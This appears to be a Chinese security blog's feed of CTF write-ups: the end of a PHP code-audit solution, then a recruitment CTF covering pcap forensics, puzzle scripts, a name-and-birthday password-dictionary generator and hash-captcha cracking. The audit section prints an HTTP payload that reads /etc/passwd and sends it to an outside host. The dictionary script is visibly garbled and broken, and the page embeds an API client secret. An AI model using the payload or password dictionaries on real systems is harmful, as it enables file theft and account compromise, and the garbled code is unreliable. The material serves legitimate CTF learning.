class="line">&#125;</span><br></pre></td></tr></table></figure><p>在add函数中第7行代码出了问题<br><code>elseif (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[0] === &#39;@&#39;)</code><br>如果value是”@”开头的字符串的话会转入<code>addFile</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (is_resource($value)) &#123;</span><br><span class="line">...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">$value = substr($value, <span class="number">1</span>);</span><br><span class="line">$filename = basename($value);</span><br><span class="line">$content = file_get_contents($value);</span><br><span class="line">$contentType = $finfo-&gt;file($value);</span><br><span class="line">&#125;</span><br><span class="line">$part = <span class="keyword">$this</span>-&gt;newPart($name, $content);</span><br><span class="line">$part-&gt;type($contentType);</span><br><span class="line"><span class="keyword">if</span> ($filename) &#123;</span><br><span class="line">$part-&gt;filename($filename);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;add($part);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $part;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>由于此时进来的<code>$value</code>是一个字符串，所以流程会转入else中，而在else里第10行代码可以直接读取文件<br><code>$content = file_get_contents($value);</code><br>读取到的内容在<code>$content</code>变量中，而<code>$content</code>会存入<code>FormDataPart</code>里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newPart</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> FormDataPart($name, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后再次将part加入<code>add($part)</code>，所以读取到的content会存在body中,这样就构成了一个本地文件读取漏洞，<br>Paylaod:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?url&#x3D;http:&#x2F;&#x2F;\*\*\*.\*\*\*.\*\*\*.\*\*\*&#x2F;&amp;data[a]&#x3D;@&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1</span><br><span class="line">Host: 13.230.134.135</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.67 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Referer: http:&#x2F;&#x2F;13.230.134.135&#x2F;</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: BD_UPN&#x3D;12314753</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>会在服务器收到读取到的文件内容</p><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"fb9b672afa74e328fbe8","clientSecret":"1fa3f067c53df3bd3686b004980eaca2fe8f5ede","repo":"srpopty.github.io","owner":"Srpopty","admin":["Srpopty"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script>]]></content>
    
    <summary type="html">
    
      Orange的一道代码审计题目，整个比赛期间的第一道web题，鄙人也认为是很难的一道题(1700多个队只解出来4个)，赛后看了PDKT的题解，发现有很多可以在代码审计中学习的地方，还用到了前段时间在BlackHat USA上新提出的PHP反序列化技术，这里将分析一波。
    
    </summary>
    
    
      <category term="ctf" scheme="https://srpopty.github.io/categories/ctf/"/>
    
    
      <category term="writeup" scheme="https://srpopty.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>BlueWhale2018年纳新题目Writeup</title>
    <link href="https://srpopty.github.io/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/"/>
    <id>https://srpopty.github.io/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/</id>
    <published>2018-10-10T12:01:47.000Z</published>
    <updated>2020-03-11T13:34:33.238Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="BabyForensics-200"><a href="#BabyForensics-200" class="headerlink" title="BabyForensics (200)"></a>BabyForensics (200)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">一名黑客渗透了一个网站，并且最后拿到了一份机密信息，我们抓到了黑客入侵过程的全部流量，正在进行取证工作</span><br><span class="line"></span><br><span class="line">请问这个网站使用的PHP框架是什么？</span><br><span class="line">请问黑客最后拿到的机密文件中MYSQL服务器的用户名与密码是什么？</span><br><span class="line">请问黑客最后拿到的机密文件中MYSQL服务器的IPV4地址是什么？</span><br><span class="line">此题仅限大一学生，大二及以上学生不计分</span><br><span class="line"></span><br><span class="line">注： flag中的字母全部小写</span><br><span class="line"></span><br><span class="line">flag格式为&quot;flag&#123;框架名称_MYSQL用户名_MYSQL密码_MYSQL的IP地址&#125;&quot;</span><br><span class="line"></span><br><span class="line">流量包：https:&#x2F;&#x2F;**********&#x2F;resource&#x2F;BabyForensics.zip</span><br><span class="line">备用下载：http:&#x2F;&#x2F;**********&#x2F;temp&#x2F;BabyForensics.zip</span><br><span class="line">Update: 流量包已上传至群文件中</span><br></pre></td></tr></table></figure><p>压缩文件下载下来后解压出来是一个pcap文件，不知道怎么打开可以Google一下<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911104547.png" alt></p><p>找到<a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark</a>下载安装，开始取证</p><p>pcap文件是一个很大的数据包，里面包含了许多个小的数据包，数据包根据协议也有很多的种类<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911104914.png" alt><br>上图中的协议有ARP、TCP与HTTP，此题只需关注http的数据包</p><p>使用显示过滤器过滤出http的数据包<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/LUXR1U9KDHAFRB67XUIP.png" alt><br>上图中圈起来的就是“一对”数据包，上面的是请求包，下面的是响应包。每次浏览网页时，浏览器会向服务器发送一个请求，服务器收到请求后会返回一个响应。题目描述中讲到黑客最后获取了一份机密文件，所以这里进一步关注服务器的响应包，并且这个响应包应该是在最后。</p><p>从最后一个响应包，一个一个往前翻，在第734581个数据包中发现了一份配置文件，这里面有这道题的所有答案<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911105723.png" alt><br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911105806.png" alt></p><p>PHP框架：douphp<br>MYSQL地址：10.3.3.101<br>MYSQL用户名：web<br>MYSQL密码：e667jUPvJjXHvEUv</p><blockquote><p>flag{douphp_web_e667jUPvJjXHvEUv_10.3.3.101}</p></blockquote><p>另外由于这三个题是相互关联的，所以黑客的IP地址为192.168.94.59</p><hr><h2 id="Mail1-500"><a href="#Mail1-500" class="headerlink" title="Mail1 (500)"></a>Mail1 (500)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一名黑客渗透了一个网站，我们抓到了黑客入侵过程的全部流量，正在进行取证工作</span><br><span class="line"></span><br><span class="line">请问黑客的IP地址是多少？</span><br><span class="line">请问该系统中所使用的交换机的型号是多少？</span><br><span class="line">已知网站中使用了某种简单的Tomcat容器自身的访问控制机制，请问该网站中Tomcat认证的用户名和密码是多少？</span><br><span class="line">注： flag中的字母全部小写</span><br><span class="line">flag格式为&quot;flag&#123;IP地址_型号_用户名_密码&#125;&quot;</span><br><span class="line">流量包：https:&#x2F;&#x2F;**********&#x2F;resource&#x2F;Mail1.zip</span><br><span class="line">Update: 流量包已上传至群文件中</span><br></pre></td></tr></table></figure><p>黑客的IP地址上一问已经出来了，接着寻找交换机的型号。一个包一个包的翻肯定是不现实的，最好的办法就是用关键字搜索<br>交换机的英文是switch，在字节流中搜索一下就能找到<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911112450.png" alt></p><p>关于Tomcat容器自身的访问控制机制，题目中给了一个<a href="https://blog.csdn.net/zzy7075/article/details/53639832" target="_blank" rel="noopener">参考链接</a>，<strong>认真</strong>看完那篇文章，就能发现文章中介绍的那么多访问控制机制中，只有一个是经常在web表单认证中使用的<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911112741.png" alt><br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/3_CZVSIG0HQBL58XIHEO.png" alt></p><p>于是继续搜索关键词j_username与j_password，也是一下就能找到<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911113108.png" alt></p><p>黑客的IP地址：192.168.94.59<br>交换机的型号：s5120-28p-li<br>认证用户名：system<br>认证密码：manager</p><blockquote><p>flag{192.168.94.59_s5120-28p-li_system_manager}</p></blockquote><hr><h2 id="Mail2-500"><a href="#Mail2-500" class="headerlink" title="Mail2 (500)"></a>Mail2 (500)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">一名黑客渗透了一个网站，我们抓到了黑客入侵过程的全部流量，正在进行取证工作</span><br><span class="line"></span><br><span class="line">请问管理员的邮箱是什么？</span><br><span class="line">请问黑客登录的邮箱中一共有几封邮件？</span><br><span class="line">请问黑客登录的邮箱中发送的最早的一封邮件的时间是多少？（转换成时间戳）</span><br><span class="line">Hint1: 这三道流量分析题目是相互关联的</span><br><span class="line">Hint2: 在该流量包中有两个不同的人登录过邮箱，其中一个才是黑客，另一个不用管他</span><br><span class="line"></span><br><span class="line">注： flag中的字母全部小写</span><br><span class="line">flag格式为&quot;flag&#123;管理员邮箱_邮件数量_时间戳&#125;&quot;</span><br><span class="line">流量包：https:&#x2F;&#x2F;*********&#x2F;resource&#x2F;Mail2.zip</span><br><span class="line">Update: 流量包已上传至群文件中</span><br></pre></td></tr></table></figure><p>这个题就需要仔细分析整个流量包了，首先只需关注http的包，并且一直这三道题是相互关联的，那么在这个流量包中只需定位黑客IP地址的包即可，使用显示过滤器进行过滤，由此定位到黑客登录邮箱那附近的数据包，进行标记<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911113827.png" alt><br>一般在登录邮箱后进入的页面会显示邮箱中所有的邮件，所以在登录数据包的后面不远处肯定能找到邮箱中的全部邮件，追踪这个包的Http字节流，在登陆之后的几个包中就能找到请求邮件的包<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911114150.png" alt></p><p>在这个包后面的那个包中就是所有邮件的列表，将其字节流导出为html文件，之后在浏览器打开<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911114512.png" alt></p><p>所以最早的日期为<br>2018-08-08 14:36<br>将其转换为时间戳为<br>1533710160</p><p>另外寻找管理员的邮箱只需在字节流中查找关键字“admin@”即可，非常好找<br><img src="/2018/10/10/BlueWhale2018%E5%B9%B4%E7%BA%B3%E6%96%B0%E9%A2%98%E7%9B%AEWriteup/TIM%E6%88%AA%E5%9B%BE20180911114839.png" alt></p><p>管理员邮箱：<a href="mailto:admin@test.com">admin@test.com</a><br>邮件数量：15<br>时间戳：1533710160</p><blockquote><p>flag{admin@test.com_15_1533710160}</p></blockquote><hr><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="查找素数-150"><a href="#查找素数-150" class="headerlink" title="查找素数 (150)"></a>查找素数 (150)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">已知有一个等差数列，其首元素为455，公差为194, 要求找出在该数列中的第149个素数</span><br><span class="line"></span><br><span class="line">此题仅限于大一学生，大二及以上学生该题不计分</span><br><span class="line"></span><br><span class="line">flag格式为flag&#123;程序结果&#125;</span><br></pre></td></tr></table></figure><p>在一个很大的等差数列中找素数，很简单，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, int(n/<span class="number">2</span>+<span class="number">1</span>)):</span><br><span class="line">        <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sequence = <span class="number">455</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> check(sequence):</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">149</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    sequence += <span class="number">194</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> sequence</span><br></pre></td></tr></table></figure><p>结果为165161</p><blockquote><p>flag{165161}</p></blockquote><hr><h2 id="下落的小球-180"><a href="#下落的小球-180" class="headerlink" title="下落的小球 (180)"></a>下落的小球 (180)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">已知有一颗最大深度为16的完全二叉树，所有叶子结点深度相同。若在根节点处放一个小球，小球会沿着根节点结点开始下落。该完全二叉树内每个结点上都有一个开关，默认全部关闭，当小球下落后，每当有小球落到一个开关上时，开关的状态会改变。当小球到达一个结点时，如果该结点上的开关关闭，则往小球向左走，否则向右走，直到到达叶子结点为止。求第12345个小球落下后的叶子结点编号。</span><br><span class="line"></span><br><span class="line">flag格式为flag&#123;结点编号&#125;</span><br></pre></td></tr></table></figure><p> 此题的意思是在一个深度为16的已经编号了序号的二叉树上，从根节点出下落一个小球，如果该节点为关则下一步小球向左走，否则向右走，默认全部为开，小球经过后开关取反。<br> 可以用列表构造一颗二叉树，里面包含了所有节点，之后模拟每一个小球的下落过程，直到第12345个小球为止<br>根据二叉树的性质，深度为n的二叉树最多有2^n-1个节点，所以列表大小行为2^16-1<br> 小球一开始从根节点（1号节点）开始落下每次下落一层，如果往左下落，则下一个节点的编号为当前节点编号的2倍，往右落下则为往左落下的节点编号+1<br>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tree = [<span class="literal">False</span>] * (<span class="number">2</span> ** <span class="number">16</span> - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> ball <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">12345</span> + <span class="number">1</span>):</span><br><span class="line">    node = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">15</span>):</span><br><span class="line">        _node = node</span><br><span class="line">        node = node * <span class="number">2</span> + <span class="number">1</span> <span class="keyword">if</span> tree[node] <span class="keyword">else</span> node * <span class="number">2</span></span><br><span class="line">        tree[_node] = <span class="keyword">not</span> tree[_node]</span><br><span class="line">        <span class="keyword">if</span> ball == <span class="number">12345</span> <span class="keyword">and</span> layer == <span class="number">14</span>:</span><br><span class="line">            <span class="keyword">print</span> node</span><br></pre></td></tr></table></figure><p>最后结果为36358</p><blockquote><p>flag{36358}</p></blockquote><hr><h2 id="密码生成-200"><a href="#密码生成-200" class="headerlink" title="密码生成 (200)"></a>密码生成 (200)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">已知某人的姓名如生日，要求制作出一份字典，准确率越高越好</span><br><span class="line">关于字典</span><br><span class="line"></span><br><span class="line">测试时我们会准备一些不会超出题目范围的密码，其中包含了姓名与生日的信息</span><br><span class="line"></span><br><span class="line">注意并不一定是全部信息，可能包含了部分信息，例如姓名为zhang san，其生日是1998 5 3，我们的测试密码为zhang199853或zs980503</span><br><span class="line"></span><br><span class="line">我们将会测试我们准备的密码是否程序生成的字典之中，并且对程序生成密码的准确性与广泛性以及生成算法做一个估计与评价</span><br><span class="line"></span><br><span class="line">语言限制为C或C++，源代码中最好包含注释，注意变量、函数等命名规范</span><br><span class="line"></span><br><span class="line">此题仅限于大一学生，大二及以上学生该题不计分</span><br><span class="line"></span><br><span class="line">程序完成后请将源码打包发送至邮箱********@outlook.com，通过后我们会将flag发送给你</span><br><span class="line"></span><br><span class="line">严禁抄袭</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">一共包含两行</span><br><span class="line">第一行为姓名的拼音，之间用空格分割</span><br><span class="line">    可以保证全部为小写并且姓名长度小于等于4个字（如&quot;诸葛孔明&quot; -&gt; &quot;zhu ge kong ming&quot; 或 &quot;洁&quot; -&gt; &quot;jie&quot; ）</span><br><span class="line">第二行为生日，之间用空格分割</span><br><span class="line">    可以保证没有前导0，并且生日是完全合理的（即不会出现9999 9999 9999这样的输入，但可能会出现483 2 9这类，483年2月9日）</span><br><span class="line">如</span><br><span class="line">    zhang san</span><br><span class="line">    1998 5 3</span><br><span class="line">输出格式</span><br><span class="line">要求输出到名为&#39;dic.txt&#39;的文件中，每行一个密码</span><br><span class="line">如</span><br><span class="line">    zhang199853</span><br><span class="line">    zhang1998053</span><br><span class="line">    zhang19980503</span><br><span class="line">    Zhang199853</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure><p> 只需要尽可能多的考虑常见的姓名与生日的组合即可，先手动分析一下，以”张三 1998 5 27”为例<br> zhang san<br> 1998 5 27  </p><ol><li>姓名与生日的组合方式只有两种<br>姓名 + 生日<br>生日 + 姓名  </li><li>姓名的组合方式有全称和缩写两种<br>其中姓名的每一个字都有可能为缩写，例如<br>zhangsan(没有缩写) -&gt; zhangs(“三”被缩写) -&gt; zsan(“张”被缩写) -&gt; zs(两个字都缩写)<br>三个字和四个字的名字同理  </li><li>姓名的大小写组合方式<br>考虑每个姓名方式的大小写情况<br>Zhangsan ZHangsan …  </li><li>姓氏单独出现<br>也有可能只有姓氏出现，比如 zhang19980521  </li><li>生日中年份的组合有两种<br>如 1998 或 98  </li><li>月与日的组合也各有两种<br>分为有前导0和每有前导0两种<br>如 521 或 0521(5有前导0)<br>假如生日为1号，则 0501(都有前导0) 或 051(5有前导0) 或 501(1有前导0) 或 51(都没有前导0)</li></ol><p>可能的结果分析清楚后，一层一层的叠加处理即可，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Permutations</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">LetterCase</span><span class="params">(strings)</span>:</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span> &gt; j) &amp; <span class="number">1</span> <span class="keyword">else</span> s.upper()</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            res.append(word)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">WordCombination</span><span class="params">(word)</span>:</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span> &gt; j) &amp; <span class="number">1</span> <span class="keyword">else</span> s</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            res.append(word)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Name</span></span><br><span class="line">name = raw_input().split(<span class="string">' '</span>)</span><br><span class="line">_name = list()</span><br><span class="line">_name.append(name[<span class="number">0</span>])</span><br><span class="line">_name.append(<span class="string">''</span>.join(name[<span class="number">1</span>:]))</span><br><span class="line">_name += Permutations.WordCombination(name)</span><br><span class="line">name = list()</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> _name:</span><br><span class="line">    name += Permutations.LetterCase(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Birthday</span></span><br><span class="line">birthday = raw_input().split(<span class="string">' '</span>)</span><br><span class="line">year = [birthday[<span class="number">0</span>], birthday[<span class="number">0</span>][<span class="number">-2</span>:]]</span><br><span class="line">month = [birthday[<span class="number">1</span>]]</span><br><span class="line"><span class="keyword">if</span> len(birthday[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="验证码破解-350"><a href="#验证码破解-350" class="headerlink" title="验证码破解 (350)"></a>验证码破解 (350)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">要求编程解决哈希验证码破解</span><br><span class="line">关于哈希验证码</span><br><span class="line">观察下面一行代码</span><br><span class="line">    substr(md5(&#39;请在此输入验证码&#39;),0,6) &#x3D;&#x3D;&#x3D; &#39;dc55b0&#39;</span><br><span class="line">该行代码输要求我们入一个字符串，使得该字符串进行MD5运算之后的0到5位等于&#39;dc55b0&#39;</span><br><span class="line">该字符串称为哈希验证码</span><br><span class="line">测试时我们会准备一些不同种类且范围小于等于6位的待破解的验证码，根据破解出验证码的速度与时间以及内存的使用量对程序做一个估计与评价</span><br><span class="line"></span><br><span class="line">我们准备测试的哈希验证码种类包含: MD5、 SHA1以及SHA256</span><br><span class="line"></span><br><span class="line">提示：可以参考彩虹表以及鸽巢原理，从而大大加快验证码的破解速度</span><br><span class="line"></span><br><span class="line">语言限制为C或C++，源代码中最好包含注释，注意变量、函数等命名规范</span><br><span class="line"></span><br><span class="line">程序完成后请将源码打包发送至邮箱********@outlook.com，通过后我们会将flag发送给你</span><br><span class="line"></span><br><span class="line">此题推荐大二及以上学生，但如果大一学生完成此题则有加分奖励</span><br><span class="line"></span><br><span class="line">哈希函数（MD5,SHA1,SHA256）运算部分的代码可以参考使用互联网上的例子，其余代码严禁抄袭</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">一共三行</span><br><span class="line">第一行为要破解的验证码种类，取值范围为&quot;MD5&quot;、&quot;SHA1&quot;或&quot;SHA256&quot;，字母大写</span><br><span class="line">第二行为要破解的验证码</span><br><span class="line">    可以保证是可破解的并且长度不超过6位</span><br><span class="line">第三行为要破解的验证码范围，包括两个整形数字，之间用空格分隔</span><br><span class="line">    